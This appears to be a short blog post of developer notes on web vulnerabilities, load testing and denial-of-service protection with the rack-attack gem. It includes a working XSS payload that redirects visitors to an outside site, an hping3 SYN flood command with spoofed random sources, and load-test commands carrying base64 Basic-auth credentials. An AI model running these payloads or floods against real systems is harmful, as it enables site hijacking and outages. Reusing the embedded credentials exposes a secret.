---
layout: post
title: Web vulerability and dos attacks
---

* [OWASP](https://www.owasp.org/index.php/Category:Attack) nice examples of
attack and vulnerability

~~~
<IMG SRC=/ onerror="console.log('cao. bolje da eskejpujete sadrzaj');location.assign('http://www.iznajmljivanjeprojektoranovisad.in.rs')"></img>
~~~

# DOS attack

* `sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source
  myapp.herokuapp.com`
* you can generate authnentication key for http basic authentication with

~~~
auth=`echo -n 'username:password' | openssl base64`
~~~

## Siege

Run 25 concurent users 1 minute with basic http authorization:

~~~
siege myapp.herokuapp.com -c25 -t1M -H "Authorization: Basic
bmalrb2xhb2I6bmlrb2xhamVjYXI="
~~~

## AB

Run 500 requests in 5 threads:

~~~
ab -n 500 -c 5 -H 'Authorization:Basic barb2xhb2I6bmlrb2xhamVjYXI=' http://yourapp.com/
ab -kc 10 -t 10 url # 10 seconds in 10 threads
~~~

# Rack Attack

You can use [rack-attack gem](https://github.com/kickstarter/rack-attack) to
prevent dos attacks. It can allow all requests from `saveflist` and ban all
requests from `blocklist`. Than it check for  throttle`

~~~
echo 'rack-attack' >> Gemfile
bundle
sed -i config/application.rb -e '/  end$/i \
    config.middleware.use Rack::Attack'

cat > config/initializers/rack_attack.rb << HERE_DOC
HERE_DOC
~~~
